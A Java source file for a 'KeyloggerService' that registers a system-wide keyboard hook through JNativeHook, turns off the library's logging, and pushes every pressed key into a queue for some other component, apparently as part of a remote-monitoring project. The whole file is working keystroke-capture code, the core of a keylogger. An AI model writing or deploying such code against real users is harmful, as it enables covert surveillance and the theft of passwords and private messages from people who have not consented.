package service.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.util.concurrent.LinkedBlockingQueue;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyloggerService {

    private final LinkedBlockingQueue<String> keyQueue;
    private NativeKeyListener hookListener;
    private volatile boolean running = false;

    public KeyloggerService(LinkedBlockingQueue<String> keyQueue) {
        this.keyQueue = keyQueue;
    }

    public void start() {
        if (running) return;
        running = true;

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        try {
            if (!GlobalScreen.isNativeHookRegistered()) {
                GlobalScreen.registerNativeHook();
            }

            hookListener = new NativeKeyListener() {
                @Override
                public void nativeKeyPressed(NativeKeyEvent e) {
                    if (!running) return;
                    String key = NativeKeyEvent.getKeyText(e.getKeyCode());
                    System.out.println("ban da nhan "+key);
                    keyQueue.offer(key);
                }
                @Override public void nativeKeyReleased(NativeKeyEvent e) {}
                @Override public void nativeKeyTyped(NativeKeyEvent e) {}
            };

            GlobalScreen.addNativeKeyListener(hookListener);
            System.out.println("[KEYLOGGER SERVICE] Hook đã đăng ký.");

        } catch (Exception e) {
            System.out.println("[KEYLOGGER SERVICE] Lỗi đăng ký hook: " + e.getMessage());
            running = false;
        }
    }

    public void stop() {
        if (!running) return;
        running = false;

        try {
            if (hookListener != null) {
                GlobalScreen.removeNativeKeyListener(hookListener);
                hookListener = null;
            }
            GlobalScreen.unregisterNativeHook();
            System.out.println("[KEYLOGGER SERVICE] Hook đã huỷ.");
        } catch (Exception e) {
            System.out.println("[KEYLOGGER SERVICE] Lỗi huỷ hook: " + e.getMessage());
        }

        keyQueue.offer("__STOP__");
    }

    public boolean isRunning() {
        return running;
    }
}